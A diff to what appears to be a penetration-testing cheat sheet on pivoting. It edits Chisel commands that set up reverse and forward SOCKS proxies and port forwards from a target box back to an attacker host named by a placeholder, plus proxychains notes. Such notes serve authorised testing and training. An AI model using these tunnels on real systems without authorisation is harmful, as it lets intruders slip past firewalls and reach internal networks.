@@ -58,17 +58,17 @@ Set up dynamic tunnels to scan through them (see scanning section below for more
 Good for getting through firewalls, need correct copies of binaries on both target / attack box  
 Need to change /etc/proxychains4.conf socks4 to socks5 on attack box 
 ### Chisel socks Reverse Proxy 
-    attack    ./chisel server -p LISTEN_PORT --reverse &  
-    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
+    attack box    $ ./chisel server -p LISTEN_PORT --reverse &  
+    target box    $ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
 ### Chisel socks Forward Proxy 
-    target    ./chisel server -p LISTEN_PORT --socks5  
-    attack    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
+    target    $ ./chisel server -p LISTEN_PORT --socks5  
+    attack    $ ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
 ### Chisel Remote Port Forward 
-    attack    ./chisel server -p LISTEN_PORT --reverse &  
-    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
+    attack    $ ./chisel server -p LISTEN_PORT --reverse &  
+    target    # ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
 ### Chisel Local Port Forward 
-    target    ./chisel server -p LISTEN_PORT 
-    attack    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
+    target    $ ./chisel server -p LISTEN_PORT 
+    attack    $ ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
  
 ## Metasploit Tunneling   
 Route pivoting:    
